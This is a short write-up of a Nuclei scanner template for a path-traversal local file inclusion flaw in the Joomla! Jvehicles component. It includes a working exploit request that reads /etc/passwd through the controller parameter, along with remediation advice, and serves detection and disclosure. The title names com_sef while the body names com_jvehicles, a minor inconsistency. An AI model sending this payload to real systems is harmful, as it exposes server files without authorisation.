# Nuclei Template: Joomla! Component com_sef - Local File Inclusion
**Template ID:** joomla-jvehicles-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`joomla-jvehicles-lfi.yaml`)

## Vulnerability Information & PoC

## Description
A local file inclusion vulnerability in the Jvehicles (com_jvehicles) component version 1.0 for Joomla! allows remote attackers to load arbitrary files via the controller parameter in index.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00
```

## Remediation
Upgrade to the latest version to mitigate this vulnerability.

## References
- https://www.exploit-db.com/exploits/11997
